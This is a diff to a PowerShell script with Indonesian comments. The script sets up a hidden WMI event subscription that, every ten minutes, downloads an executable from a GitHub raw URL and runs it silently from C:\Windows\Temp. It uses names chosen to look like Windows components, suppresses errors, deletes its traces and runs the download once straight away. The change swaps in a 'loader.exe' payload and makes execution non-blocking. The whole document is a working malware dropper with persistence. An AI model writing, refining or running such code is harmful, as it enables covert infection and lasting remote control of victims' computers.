@@ -1,13 +1,13 @@
 $ErrorActionPreference = "SilentlyContinue"
 
 # ===== Konfigurasi =====
-$url = 'https://raw.githubusercontent.com/elmismedina0126/blablawa/main/noobs.exe'
+$url = 'https://raw.githubusercontent.com/elmismedina0126/blablawa/main/loader.exe'
 $temp = 'C:\Windows\Temp\ldr.exe'
 $filterName = 'Microsoft-Windows-SystemSecurity'
 $consumerName = 'WindowsSystemMaintenance'
 $interval = 600   # 600 detik = 10 menit
 
-# ===== Hapus subscription lama jika ada =====
+# ===== Hapus subscription lama =====
 Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding |
     Where-Object { $_.Filter -like "*$filterName*" -or $_.Consumer -like "*$consumerName*" } |
     Remove-WmiObject
@@ -20,8 +20,8 @@ Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer |
     Where-Object { $_.Name -eq $consumerName } |
     Remove-WmiObject
 
-# ===== Skrip download + execute + cleanup =====
-$downloadCommand = "try { iwr '$url' -OutFile '$temp' -UseBasicParsing; Unblock-File '$temp'; Start-Process '$temp' -WindowStyle Hidden -Wait; Remove-Item '$temp' -Force } catch {}"
+# ===== Skrip download + execute + cleanup (tanpa -Wait) =====
+$downloadCommand = "try { iwr '$url' -OutFile '$temp' -UseBasicParsing; Unblock-File '$temp'; Start-Process '$temp' -WindowStyle Hidden; Start-Sleep -Seconds 2; Remove-Item '$temp' -Force } catch {}"
 
 # Command untuk WMI consumer (bungkus dengan powershell -c)
 $consumerCommand = "powershell -NoP -WindowStyle Hidden -c `"$downloadCommand`""
@@ -46,5 +46,5 @@ Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" 
     Consumer = $consumer
 }
 
-# ===== Eksekusi langsung sebagai tes =====
-Invoke-Expression $downloadCommand
+# ===== Eksekusi langsung sebagai tes (asinkron, tidak memblokir) =====
+Start-Process powershell -ArgumentList "-NoP -WindowStyle Hidden -c `"$downloadCommand`"" -WindowStyle Hidden
